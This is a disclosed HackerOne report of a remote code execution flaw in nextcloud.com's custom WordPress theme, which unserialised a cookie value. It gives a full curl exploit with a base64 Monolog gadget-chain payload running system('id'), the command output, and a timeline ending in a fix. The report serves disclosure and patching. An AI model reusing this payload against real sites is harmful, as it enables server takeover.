---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/deserialization-of-untrusted-data
  - env/web
  - stack/wordpress
substate: "resolved"
weakness: "Deserialization of Untrusted Data"
enriched: true
date: 2023-12-28
submitted: 2023-11-10T20:55:17.196Z
bounty_usd: null
votes: 83
cve: []
program: "[[programs/nextcloud|Nextcloud]]"
reporter: "lukasreschke"
source: "https://hackerone.com/reports/2248328"
title: "RCE on Wordpress website"
---
# RCE on Wordpress website

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 83 | **Program:** Nextcloud | **Disclosed:** 2023-12-28

- Report: [https://hackerone.com/reports/2248328](https://hackerone.com/reports/2248328)
- CWE: Deserialization of Untrusted Data
- Submitted: 2023-11-10T20:55:17.196Z

## Report summary

Nextcloud.com is using a custom self-developed theme which was vulnerable to a remote code execution (RCE).

This was caused due to unserialising user-input from cookies as can be seen at https://github.com/nextcloud/nextcloud-theme/blob/e6db0a90391ec94f9eb6d86e16dc16e36c5f4dd4/inc/ninjaforms.php#L114

As gadget chain I’ve used Monolog which was also installed, the final exploit to execute arbitrary code (`system(“id”)`) looked like this:

```
curl -i -s -k -X $'GET' \
    -H $'Host: nextcloud.com' \
    -b $'nc_cookie_banner={\"essentials\":true,\"convenience\":false,\"statistics\":{\"matomo\":false},\"external_media\":{\"youtube\":false,\"vimeo\":false}}; wp-wpml_current_language=en; nc_form_fields=TzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6NDp7czoxNjoiACoAcGFzc3RocnVMZXZlbCI7aTowO3M6MTA6IgAqAGhhbmRsZXIiO3I6MTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czoyOiJpZCI7czo1OiJsZXZlbCI7aToxMDA7fX1zOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjM6InBvcyI7aToxO3M6Njoic3lzdGVtIjt9fQ==' \
    $'https://nextcloud.com/newsletter/'
```

The response would then contain the reply of the executed code:

```
<!-- Performance optimized by Redis Object Cache. Learn more: https://wprediscache.com -->uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Timeline

- **Report Filed**
- **2023-11-10** @Nextcloud: Thanks a lot for reporting this potential issue back to us!

Our security team will take a look at this issue as soon as possible. For obvious reasons we'd like to ask you to not disclose this issue to any other party.
- **Report Triaged**
- **2023-11-23** @lukasreschke: Any update on this?
- **2023-11-27** @nickvergessen: The problem should be removed by now. Feel free to verify.
- **2023-11-27** @lukasreschke: Mind marking this ticket as closed then? :)
- **Report Resolved**
- **Agreed On Going Public**
- **Report Title Updated**
- **Not Eligible For Bounty**
- **Report Became Public**
